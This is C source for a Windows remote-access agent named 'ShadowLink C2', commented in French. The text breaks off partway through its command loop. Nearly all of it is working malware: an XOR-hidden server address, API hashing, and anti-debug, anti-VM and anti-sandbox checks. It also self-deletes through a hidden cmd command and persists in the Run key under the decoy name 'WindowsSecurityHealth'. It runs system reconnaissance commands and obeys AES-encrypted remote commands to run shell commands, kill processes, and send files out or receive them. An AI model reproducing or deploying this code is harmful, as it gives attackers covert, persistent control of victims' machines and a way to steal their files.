/*
 * ShadowLink C2 Agent - Implementation
 * Phase 7: File Transfer + Process Management
 */

#include "agent.h"
#include "aes.h"
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <shlobj.h>  // Pour SHGetFolderPath
#include <tlhelp32.h> // Pour les processus

#define BUFFER_SIZE 4096
#define RECON_BUFFER_SIZE 65536  // 64KB pour le rapport recon
#define FILE_CHUNK_SIZE 4096     // Taille des chunks pour le transfert de fichiers
#define RECONNECT_DELAY 5000     // 5 secondes entre chaque tentative
#define MAX_RECONNECT_DELAY 60000 // Max 60 secondes

// Mode stealth global (peut être désactivé)
static int stealth_mode = 1;


// ============================================
// ADVANCED EVASION - XOR STRING ENCRYPTION
// ============================================

// IP chiffrée avec XOR 0x5A: "127.0.0.1" -> bytes chiffrés
static unsigned char encrypted_ip[] = {0x6b, 0x6c, 0x63, 0x7a, 0x6a, 0x7a, 0x6a, 0x7a, 0x6b, 0x00};

// Déchiffre une chaîne en place avec XOR
void xor_decrypt(char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Retourne l'IP du serveur déchiffrée (buffer statique)
char* get_decrypted_server_ip(void) {
    static char decrypted_ip[16];
    static int decrypted = 0;
    
    if (!decrypted) {
        memcpy(decrypted_ip, encrypted_ip, sizeof(encrypted_ip));
        xor_decrypt(decrypted_ip, strlen(decrypted_ip), XOR_KEY);
        decrypted = 1;
    }
    return decrypted_ip;
}


// ============================================
// ADVANCED EVASION - API HASHING (djb2)
// ============================================

// Hash djb2 - rapide et efficace
unsigned long djb2_hash(const char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    }
    return hash;
}

// Hashes précalculés pour les API critiques
#define HASH_ISDEBUGGERPRESENT       0x7efe2b11  // "IsDebuggerPresent"
#define HASH_CHECKREMOTEDEBUGGER     0x90b8a875  // "CheckRemoteDebuggerPresent"
#define HASH_VIRTUALALLOC            0x97bc257b  // "VirtualAlloc"
#define HASH_VIRTUALFREE             0x54a3db12  // "VirtualFree"
#define HASH_CREATEFILEA             0x7c8b8f66  // "CreateFileA"
#define HASH_DELETEFILEA             0x9e7f8e12  // "DeleteFileA"
#define HASH_SLEEP                   0x0b884101  // "Sleep"

// Résout une API par son hash dans un module
FARPROC resolve_api_by_hash(HMODULE module, unsigned long target_hash) {
    // Obtenir le DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    // Obtenir le NT header
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)module + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    // Obtenir l'export directory
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) return NULL;
    
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module + exportDirRVA);
    
    DWORD *nameRVAs = (DWORD*)((BYTE*)module + exportDir->AddressOfNames);
    WORD *ordinals = (WORD*)((BYTE*)module + exportDir->AddressOfNameOrdinals);
    DWORD *funcRVAs = (DWORD*)((BYTE*)module + exportDir->AddressOfFunctions);
    
    // Parcourir les exports
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char *funcName = (char*)((BYTE*)module + nameRVAs[i]);
        unsigned long hash = djb2_hash(funcName);
        
        if (hash == target_hash) {
            WORD ordinal = ordinals[i];
            DWORD funcRVA = funcRVAs[ordinal];
            return (FARPROC)((BYTE*)module + funcRVA);
        }
    }
    
    return NULL;
}


// ============================================
// ADVANCED EVASION - DELAYED EXECUTION
// ============================================

// Détecte une exécution trop rapide (sandbox)
int detect_fast_execution(void) {
    DWORD startTick = GetTickCount();
    
    // Effectuer une opération coûteuse
    volatile int x = 0;
    for (int i = 0; i < 100000; i++) {
        x += i * i;
    }
    
    DWORD elapsed = GetTickCount() - startTick;
    
    // Si ça prend moins de 10ms, c'est probablement accéléré (sandbox)
    return (elapsed < 10);
}

// Exécution différée avec vérification anti-sandbox
int delayed_execution(DWORD delay_ms) {
    if (!stealth_mode) return 0;
    
    DWORD startTick = GetTickCount();
    
    // Attendre le délai spécifié
    Sleep(delay_ms);
    
    DWORD elapsed = GetTickCount() - startTick;
    
    // Si le temps écoulé est significativement différent, c'est suspect
    // Les sandbox accélèrent souvent le temps
    if (elapsed < delay_ms * 0.9) {
        return 1;  // Sandbox détectée
    }
    
    return 0;  // OK
}


// ============================================
// ADVANCED EVASION - SELF-DELETION
// ============================================

int self_delete(void) {
    char exePath[MAX_PATH];
    char cmdLine[MAX_PATH * 2];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    // Obtenir le chemin de l'exécutable
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return -1;
    }
    
    // Créer une commande batch pour supprimer le fichier après un délai
    // /c = execute and close, /q = quiet, ping -n 3 = délai de ~3 secondes
    snprintf(cmdLine, sizeof(cmdLine),
        "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del /f /q \"%s\"",
        exePath);
    
    // Initialiser les structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Fenêtre cachée
    ZeroMemory(&pi, sizeof(pi));
    
    // Lancer le processus de suppression
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return -1;
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return 0;
}


// ============================================
// EVASION - ANTI-DEBUG
// ============================================

int check_debugger_present() {
    // Méthode 1: IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return 1;
    }
    
    // Méthode 2: CheckRemoteDebuggerPresent
    BOOL debuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent)) {
        if (debuggerPresent) {
            return 1;
        }
    }
    
    return 0;
}

int check_timing_attack() {
    // Mesure le temps pour une opération simple
    // Si c'est trop long, on est probablement en debug
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Opération simple
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) {
        x += i;
    }
    
    QueryPerformanceCounter(&end);
    
    // Calcul du temps en millisecondes
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000;
    
    // Si > 50ms pour cette opération simple, c'est suspect
    if (elapsed > 50.0) {
        return 1;
    }
    
    return 0;
}

int is_debugged() {
    if (!stealth_mode) return 0;
    
    return check_debugger_present() || check_timing_attack();
}


// ============================================
// EVASION - ANTI-VM / ANTI-SANDBOX
// ============================================

// Liste des noms de PC suspects
const char *suspicious_pc_names[] = {
    "SANDBOX", "VIRUS", "MALWARE", "ANALYSIS", "SAMPLE",
    "TEST", "CUCKOO", "ANALYST", "VBOX", "VMWARE", NULL
};

// Liste des noms d'utilisateurs suspects
const char *suspicious_usernames[] = {
    "admin", "administrator", "user", "test", "sandbox",
    "virus", "malware", "analyst", "vmware", "vbox", NULL
};

// Liste des processus de VM/Sandbox
const char *vm_processes[] = {
    "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
    "vboxservice.exe", "vboxtray.exe",
    "sandboxiedcomlaunch.exe", "sandboxierpcss.exe",
    "procmon.exe", "procexp.exe", "wireshark.exe",
    "fiddler.exe", "x64dbg.exe", "x32dbg.exe",
    "ollydbg.exe", "ida.exe", "ida64.exe", NULL
};

int check_suspicious_computername() {
    char computerName[256];
    DWORD size = sizeof(computerName);
    
    if (!GetComputerNameA(computerName, &size)) {
        return 0;
    }
    
    // Convertir en majuscules
    for (int i = 0; computerName[i]; i++) {
        computerName[i] = toupper(computerName[i]);
    }
    
    // Vérifier contre la liste
    for (int i = 0; suspicious_pc_names[i] != NULL; i++) {
        if (strstr(computerName, suspicious_pc_names[i]) != NULL) {
            return 1;
        }
    }
    
    return 0;
}

int check_suspicious_username() {
    char username[256];
    DWORD size = sizeof(username);
    
    if (!GetUserNameA(username, &size)) {
        return 0;
    }
    
    // Convertir en minuscules
    for (int i = 0; username[i]; i++) {
        username[i] = tolower(username[i]);
    }
    
    // Vérifier contre la liste
    for (int i = 0; suspicious_usernames[i] != NULL; i++) {
        if (strcmp(username, suspicious_usernames[i]) == 0) {
            return 1;
        }
    }
    
    return 0;
}

int check_low_resources() {
    // Vérifier la RAM (< 2GB = suspect)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    DWORDLONG totalRAM_GB = memInfo.ullTotalPhys / (1024 * 1024 * 1024);
    if (totalRAM_GB < 2) {
        return 1;
    }
    
    // Vérifier le nombre de CPU (< 2 = suspect)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return 1;
    }
    
    return 0;
}

int check_vm_processes() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }
    
    int found = 0;
    do {
        // Convertir en minuscules
        char procName[MAX_PATH];
        strncpy(procName, pe32.szExeFile, MAX_PATH);
        for (int i = 0; procName[i]; i++) {
            procName[i] = tolower(procName[i]);
        }
        
        // Vérifier contre la liste
        for (int i = 0; vm_processes[i] != NULL; i++) {
            if (strcmp(procName, vm_processes[i]) == 0) {
                found = 1;
                break;
            }
        }
        
        if (found) break;
        
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    return found;
}

int is_virtual_machine() {
    if (!stealth_mode) return 0;
    
    return check_suspicious_computername() || 
           check_suspicious_username() || 
           check_low_resources() ||
           check_vm_processes();
}


// ============================================
// EVASION - COMPORTEMENT
// ============================================

void evasion_exit() {
    // Sortie silencieuse - pas de message, pas de trace
    WSACleanup();
    ExitProcess(0);
}

int perform_evasion_checks() {
    if (!stealth_mode) return 0;
    
    // Anti-Debug
    if (is_debugged()) {
        // Attendre un peu pour ne pas être évident
        Sleep(rand() % 5000 + 1000);
        return 1;
    }
    
    // Anti-VM
    if (is_virtual_machine()) {
        // Attendre un peu
        Sleep(rand() % 5000 + 1000);
        return 1;
    }
    
    return 0;
}


// Clé partagée (32 bytes)
static const uint8_t AES_KEY[32] = "ShadowLinkAES256SecretKey32Bytes";

// Génère un IV aléatoire
void generate_iv(uint8_t *iv) {
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 16; i++) {
        iv[i] = rand() % 256;
    }
}

// Padding PKCS7
size_t pkcs7_pad(uint8_t *data, size_t len, size_t block_size) {
    size_t padding = block_size - (len % block_size);
    for (size_t i = 0; i < padding; i++) {
        data[len + i] = (uint8_t)padding;
    }
    return len + padding;
}

// Unpadding PKCS7
size_t pkcs7_unpad(uint8_t *data, size_t len) {
    uint8_t padding = data[len - 1];
    return len - padding;
}

// Chiffre les données (retourne IV + encrypted)
size_t aes_encrypt(const uint8_t *input, size_t input_len, uint8_t *output) {
    uint8_t iv[16];
    generate_iv(iv);
    
    // Copier l'IV au début de l'output
    memcpy(output, iv, 16);
    
    // Copier et padder les données
    uint8_t *padded = output + 16;
    memcpy(padded, input, input_len);
    size_t padded_len = pkcs7_pad(padded, input_len, 16);
    
    // Chiffrer
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, AES_KEY, iv);
    AES_CBC_encrypt_buffer(&ctx, padded, padded_len);
    
    return 16 + padded_len;  // IV + encrypted data
}

// Déchiffre les données
size_t aes_decrypt(const uint8_t *input, size_t input_len, uint8_t *output) {
    uint8_t iv[16];
    memcpy(iv, input, 16);
    
    size_t encrypted_len = input_len - 16;
    memcpy(output, input + 16, encrypted_len);
    
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, AES_KEY, iv);
    AES_CBC_decrypt_buffer(&ctx, output, encrypted_len);
    
    return pkcs7_unpad(output, encrypted_len);
}




int execute_command(const char *command, char *output, size_t output_size) {
    FILE *fp;
    size_t bytesRead;

    char fullCommand[BUFFER_SIZE];
    snprintf(fullCommand, sizeof(fullCommand), "cmd.exe /c chcp 65001 >nul && %s 2>&1", command);
    
    
    
    fp = _popen(fullCommand, "r");
    if (fp == NULL) {
        snprintf(output, output_size, "Failed to run command\n");
        return -1;
    }

    

    bytesRead = fread(output, 1, output_size - 1, fp);
    output[bytesRead] = '\0';

    

    if (bytesRead == 0) {
        snprintf(output, output_size, "[*] Commande executee (pas de sortie)\n");
    }

    _pclose(fp);
    return 0;
}


// Fonction de reconnaissance - collecte toutes les infos système
int do_recon(char *output, size_t output_size) {
    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    FILE *fp;
    char cmdOutput[BUFFER_SIZE];
    size_t offset = 0;
    
    // Créer un fichier temporaire
    GetTempPathA(MAX_PATH, tempPath);
    snprintf(tempFile, MAX_PATH, "%s\\recon_%lu.txt", tempPath, GetCurrentProcessId());
    
    fp = fopen(tempFile, "w");
    if (fp == NULL) {
        snprintf(output, output_size, "[!] Erreur creation fichier recon\n");
        return -1;
    }
    
    // Header
    fprintf(fp, "========================================\n");
    fprintf(fp, "   SHADOWLINK RECONNAISSANCE REPORT\n");
    fprintf(fp, "========================================\n\n");
    
    // 1. SYSINFO
    fprintf(fp, "[+] === SYSTEM INFO ===\n");
    execute_command("systeminfo | findstr /B /C:\"OS\" /C:\"System\" /C:\"Total Physical\"", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 2. WHOAMI
    fprintf(fp, "[+] === CURRENT USER ===\n");
    execute_command("whoami", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 3. PWD
    fprintf(fp, "[+] === CURRENT DIRECTORY ===\n");
    execute_command("cd", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 4. LS (répertoire courant)
    fprintf(fp, "[+] === DIRECTORY LISTING ===\n");
    execute_command("dir", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 5. IPCONFIG
    fprintf(fp, "[+] === NETWORK CONFIG ===\n");
    execute_command("ipconfig /all", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 6. NETSTAT
    fprintf(fp, "[+] === ACTIVE CONNECTIONS ===\n");
    execute_command("netstat -ano", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    fprintf(fp, "========================================\n");
    fprintf(fp, "   END OF REPORT\n");
    fprintf(fp, "========================================\n");
    
    fclose(fp);
    
    // Lire le fichier complet
    fp = fopen(tempFile, "rb");
    if (fp == NULL) {
        snprintf(output, output_size, "[!] Erreur lecture fichier recon\n");
        return -1;
    }
    
    size_t bytesRead = fread(output, 1, output_size - 1, fp);
    output[bytesRead] = '\0';
    fclose(fp);
    
    // Supprimer le fichier temporaire
    DeleteFileA(tempFile);
    
    return (int)bytesRead;
}


// ============================================
// PERSISTANCE - Registre Windows
// ============================================

int install_persistence() {
    HKEY hKey;
    char exePath[MAX_PATH];
    char persistName[] = "WindowsSecurityHealth";  // Nom discret
    
    // Obtenir le chemin de l'exécutable actuel
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return -1;
    }
    
    // Ouvrir la clé Run du registre
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return -1;
    }
    
    // Ajouter la valeur
    if (RegSetValueExA(hKey, persistName, 0, REG_SZ, 
                       (BYTE*)exePath, strlen(exePath) + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return -1;
    }
    
    RegCloseKey(hKey);
    return 0;
}

int remove_persistence() {
    HKEY hKey;
    char persistName[] = "WindowsSecurityHealth";
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return -1;
    }
    
    RegDeleteValueA(hKey, persistName);
    RegCloseKey(hKey);
    return 0;
}

int check_persistence() {
    HKEY hKey;
    char persistName[] = "WindowsSecurityHealth";
    char value[MAX_PATH];
    DWORD valueLen = MAX_PATH;
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return 0;
    }
    
    int exists = (RegQueryValueExA(hKey, persistName, NULL, NULL, 
                                   (BYTE*)value, &valueLen) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return exists;
}


// ============================================
// PROCESS MANAGEMENT
// ============================================

// Liste tous les processus en cours
int list_processes(char *output, size_t output_size) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        snprintf(output, output_size, "[!] Failed to create process snapshot\n");
        return -1;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        snprintf(output, output_size, "[!] Failed to get first process\n");
        return -1;
    }
    
    size_t offset = 0;
    offset += snprintf(output + offset, output_size - offset,
        "\n%-8s %-8s %-40s\n", "PID", "PPID", "NAME");
    offset += snprintf(output + offset, output_size - offset,
        "-------- -------- ----------------------------------------\n");
    
    do {
        if (offset >= output_size - 100) break;  // Éviter overflow
        
        offset += snprintf(output + offset, output_size - offset,
            "%-8lu %-8lu %-40s\n",
            pe32.th32ProcessID,
            pe32.th32ParentProcessID,
            pe32.szExeFile);
            
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    return (int)offset;
}

// Tue un processus par son PID
int kill_process(DWORD pid) {
    // Ne pas se tuer soi-même
    if (pid == GetCurrentProcessId()) {
        return -2;  // Code spécial
    }
    
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        return -1;
    }
    
    BOOL result = TerminateProcess(hProcess, 0);
    CloseHandle(hProcess);
    
    return result ? 0 : -1;
}


// ============================================
// FILE TRANSFER
// ============================================

// Lit un fichier et l'envoie au serveur (download depuis l'agent)
int send_file_to_server(SOCKET sock, const char *filepath) {
    FILE *fp = fopen(filepath, "rb");
    if (fp == NULL) {
        return -1;  // Fichier introuvable
    }
    
    // Obtenir la taille du fichier
    fseek(fp, 0, SEEK_END);
    long filesize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    // Envoyer d'abord les métadonnées: "OK:<size>"
    char meta[64];
    snprintf(meta, sizeof(meta), "OK:%ld", filesize);
    uint8_t encrypted_meta[128];
    size_t meta_len = aes_encrypt((uint8_t*)meta, strlen(meta), encrypted_meta);
    send(sock, (char*)encrypted_meta, meta_len, 0);
    
    // Attendre l'ACK du serveur
    char ack[64];
    int ack_len = recv(sock, ack, sizeof(ack), 0);
    if (ack_len <= 0) {
        fclose(fp);
        return -2;
    }
    
    // Lire et envoyer le fichier par chunks
    uint8_t buffer[FILE_CHUNK_SIZE];
    uint8_t encrypted[FILE_CHUNK_SIZE + 32];  // +32 pour padding + IV
    size_t bytes_read;
    long total_sent = 0;
    
    while ((bytes_read = fread(buffer, 1, FILE_CHUNK_SIZE - 32, fp)) > 0) {
        size_t encrypted_len = aes_encrypt(buffer, bytes_read, encrypted);
        
        // Envoyer la taille du chunk d'abord (4 bytes)
        uint32_t chunk_size = (uint32_t)encrypted_len;
        send(sock, (char*)&chunk_size, sizeof(chunk_size), 0);
        
        // Envoyer le chunk chiffré
        send(sock, (char*)encrypted, encrypted_len, 0);
        
        total_sent += bytes_read;
    }
    
    // Envoyer un chunk de taille 0 pour indiquer la fin
    uint32_t end_marker = 0;
    send(sock, (char*)&end_marker, sizeof(end_marker), 0);
    
    fclose(fp);
    return 0;
}

// Reçoit un fichier du serveur et le sauvegarde (upload vers l'agent)
int receive_file_from_server(SOCKET sock, const char *filepath) {
    // Recevoir les métadonnées: taille attendue
    char meta[128];
    int meta_len = recv(sock, meta, sizeof(meta), 0);
    if (meta_len <= 0) {
        return -1;
    }
    
    // Déchiffrer les métadonnées
    uint8_t decrypted_meta[128];
    size_t dec_len = aes_decrypt((uint8_t*)meta, meta_len, decrypted_meta);
    decrypted_meta[dec_len] = '\0';
    
    // Parser la taille: "SIZE:<size>"
    long expected_size = 0;
    if (strncmp((char*)decrypted_meta, "SIZE:", 5) == 0) {
        expected_size = atol((char*)decrypted_meta + 5);
    }
    
    // Ouvrir le fichier en écriture
    FILE *fp = fopen(filepath, "wb");
    if (fp == NULL) {
        // Envoyer erreur
        const char *err = "ERROR:Cannot create file";
        uint8_t encrypted_err[128];
        size_t err_len = aes_encrypt((uint8_t*)err, strlen(err), encrypted_err);
        send(sock, (char*)encrypted_err, err_len, 0);
        return -2;
    }
    
    // Envoyer ACK
    const char *ack = "READY";
    uint8_t encrypted_ack[64];
    size_t ack_len = aes_encrypt((uint8_t*)ack, strlen(ack), encrypted_ack);
    send(sock, (char*)encrypted_ack, ack_len, 0);
    
    // Recevoir les chunks
    uint8_t encrypted_chunk[FILE_CHUNK_SIZE + 32];
    uint8_t decrypted_chunk[FILE_CHUNK_SIZE];
    long total_received = 0;
    
    while (1) {
        // Recevoir la taille du chunk
        uint32_t chunk_size;
        int size_recv = recv(sock, (char*)&chunk_size, sizeof(chunk_size), 0);
        if (size_recv != sizeof(chunk_size) || chunk_size == 0) {
            break;  // Fin du transfert
        }
        
        // Recevoir le chunk
        int bytes_received = 0;
        while (bytes_received < (int)chunk_size) {
            int r = recv(sock, (char*)encrypted_chunk + bytes_received, 
                        chunk_size - bytes_received, 0);
            if (r <= 0) break;
            bytes_received += r;
        }
        
        // Déchiffrer et écrire
        size_t dec_chunk_len = aes_decrypt(encrypted_chunk, chunk_size, decrypted_chunk);
        fwrite(decrypted_chunk, 1, dec_chunk_len, fp);
        total_received += dec_chunk_len;
    }
    
    fclose(fp);
    return (total_received > 0) ? 0 : -3;
}


// ============================================
// CONNEXION AU SERVEUR
// ============================================

SOCKET connect_to_server() {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    if (sock == INVALID_SOCKET) {
        return INVALID_SOCKET;
    }
    
    // Déchiffrer l'IP du serveur à la volée
    char *server_ip = get_decrypted_server_ip();
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);
    
    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    
    return sock;
}


// ============================================
// BOUCLE DE COMMANDES
// ============================================

void command_loop(SOCKET sock) {
    while (1) {
        char commandBuffer[BUFFER_SIZE];
        int commandBytes = recv(sock, commandBuffer, sizeof(commandBuffer) - 1, 0);
        
        if (commandBytes <= 0) {
            printf("[*] Connection lost\n");
            break;
        }
        
        // Déchiffrement
        uint8_t decryptedCommand[BUFFER_SIZE];
        size_t decrypted_len = aes_decrypt((uint8_t*)commandBuffer, commandBytes, decryptedCommand);
        decryptedCommand[decrypted_len] = '\0';
        printf("[*] Received command: %s\n", (char*)decryptedCommand);

        // Commande EXIT
        if (strcmp((char*)decryptedCommand, "exit") == 0) {
            printf("[*] Exit command received\n");
            return;  // Sort de la boucle, permettra reconnexion
        }
        
        // ============================================
        // PROCESS MANAGEMENT COMMANDS
        // ============================================
        
        // Commande PS - Lister les processus
        if (strcmp((char*)decryptedCommand, "ps") == 0) {
            printf("[*] Listing processes...\n");
            char *procBuffer = (char*)malloc(RECON_BUFFER_SIZE);
            if (procBuffer == NULL) {
                const char *errorMsg = "[!] Memory allocation failed\n";
                uint8_t encryptedError[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                send(sock, (char*)encryptedError, encrypted_len, 0);
            } else {
                int len = list_processes(procBuffer, RECON_BUFFER_SIZE);
                if (len > 0) {
                    uint8_t *encryptedProc = (uint8_t*)malloc(RECON_BUFFER_SIZE + 32);
                    if (encryptedProc) {
                        size_t encrypted_len = aes_encrypt((uint8_t*)procBuffer, strlen(procBuffer), encryptedProc);
                        send(sock, (char*)encryptedProc, encrypted_len, 0);
                        free(encryptedProc);
                    }
                }
                free(procBuffer);
            }
            continue;
        }
        
        // Commande KILL <pid> - Tuer un processus
        if (strncmp((char*)decryptedCommand, "kill ", 5) == 0) {
            DWORD pid = (DWORD)atoi((char*)decryptedCommand + 5);
            printf("[*] Killing process %lu...\n", pid);
            
            const char *msg;
            int result = kill_process(pid);
            char msgBuffer[128];
            
            if (result == 0) {
                snprintf(msgBuffer, sizeof(msgBuffer), "[+] Process %lu terminated\n", pid);
                msg = msgBuffer;
            } else if (result == -2) {
                msg = "[!] Cannot kill self\n";
            } else {
                snprintf(msgBuffer, sizeof(msgBuffer), "[!] Failed to kill process %lu (access denied or not found)\n", pid);
                msg = msgBuffer;
            }
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // ============================================
        // FILE TRANSFER COMMANDS
        // ============================================
        
        // Commande DOWNLOAD <filepath> - Télécharger un fichier depuis l'agent
        if (strncmp((char*)decryptedCommand, "download ", 9) == 0) {
            const char *filepath = (char*)decryptedCommand + 9;
            printf("[*] Sending file: %s\n", filepath);
            
            int result = send_file_to_server(sock, filepath);
            
            if (result == -1) {
                const char *err = "ERROR:File not found";
                uint8_t encrypted[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)err, strlen(err), encrypted);
                send(sock, (char*)encrypted, encrypted_len, 0);
            } else if (result == 0) {
                printf("[+] File sent successfully\n");
            }
            continue;
        }
        
        // Commande UPLOAD <filepath> - Recevoir un fichier du serveur
        if (strncmp((char*)decryptedCommand, "upload ", 7) == 0) {
            const char *filepath = (char*)decryptedCommand + 7;
            printf("[*] Receiving file: %s\n", filepath);
            
            int result = receive_file_from_server(sock, filepath);
            
            const char *msg;
            char msgBuffer[256];
            if (result == 0) {
                snprintf(msgBuffer, sizeof(msgBuffer), "[+] File saved: %s\n", filepath);
                msg = msgBuffer;
            } else {
                snprintf(msgBuffer, sizeof(msgBuffer), "[!] Failed to receive file (error %d)\n", result);
                msg = msgBuffer;
            }
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande PERSIST - Installer la persistance
        if (strcmp((char*)decryptedCommand, "persist") == 0) {
            const char *msg;
            if (install_persistence() == 0) {
                msg = "[+] Persistence installed successfully\n";
            } else {
                msg = "[!] Failed to install persistence\n";
            }
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande UNPERSIST - Supprimer la persistance
        if (strcmp((char*)decryptedCommand, "unpersist") == 0) {
            const char *msg;
            if (remove_persistence() == 0) {
                msg = "[+] Persistence removed successfully\n";
            } else {
                msg = "[!] Failed to remove persistence\n";
            }
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande CHECKPERSIST - Vérifier la persistance
        if (strcmp((char*)decryptedCommand, "checkpersist") == 0) {
            const char *msg;
            if (check_persistence()) {
                msg = "[+] Persistence is ACTIVE\n";
            } else {
                msg = "[-] Persistence is NOT installed\n";
            }
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande DIE - Tuer l'agent définitivement (pas de reconnexion)
        if (strcmp((char*)decryptedCommand, "die") == 0) {
            const char *msg = "[*] Agent terminating permanently...\n";
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        
        // Commande RECON
        if (strcmp((char*)decryptedCommand, "recon") == 0) {
            printf("[*] Executing recon...\n");
            char *reconBuffer = (char*)malloc(RECON_BUFFER_SIZE);
            if (reconBuffer == NULL) {
                const char *errorMsg = "[!] Memory allocation failed\n";
                uint8_t encryptedError[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
